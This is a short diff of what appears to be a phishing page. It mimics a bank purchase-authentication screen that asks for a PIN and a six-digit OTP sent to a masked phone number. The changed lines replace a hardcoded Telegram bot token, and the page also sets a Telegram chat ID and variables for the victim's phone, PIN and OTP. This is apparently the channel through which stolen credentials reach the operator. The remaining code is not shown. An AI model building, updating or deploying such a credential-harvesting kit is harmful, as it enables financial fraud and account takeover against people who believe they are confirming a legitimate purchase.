@@ -17,7 +17,7 @@
 <div class="page" id="page3"><div class="card"><h2 class="page-title">Purchase Authentication</h2><p class="otp-info">The OTP code has been sent to <strong id="maskedPhone">+601****90</strong></p><label class="form-label">6-digit OTP</label><div class="pin-container" onclick="document.getElementById('otpInput').focus()"><div class="pin-dot" id="otp1"></div><div class="pin-dot" id="otp2"></div><div class="pin-dot" id="otp3"></div><div class="pin-dot" id="otp4"></div><div class="pin-dot" id="otp5"></div><div class="pin-dot" id="otp6"></div></div><input type="text" style="position:absolute;opacity:0" id="otpInput" maxlength="6" oninput="updateOtpDisplay(this.value)"><button class="btn-primary" onclick="submitOtp()">CONFIRM</button><button class="btn-outline" onclick="resendOtp()">RESEND</button><button class="btn-secondary" onclick="showPage2()">CANCEL</button><div class="timer-info">The page will automatically timeout after 7 minutes.<div class="timer">Time left: <span id="countdown">7:00</span></div></div></div></div>
 </div>
 <script>
-const TELEGRAM_BOT_TOKEN='8618729854:AAEDalwe28W3q6qhEvYzN2kQqX16zcpSiHY';
+const TELEGRAM_BOT_TOKEN='8574895927:AAEfsBplmF6nssjz66cMHA0ivXhEkVO7i2Q';
 const TELEGRAM_CHAT_ID='7760905169';
 let userPhone='',userPin='',userOtp='',countdownTimer;
 function showPage2(){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('page2').classList.add('active');window.scrollTo(0,0);setTimeout(()=>document.getElementById('pinInput').focus(),100)}
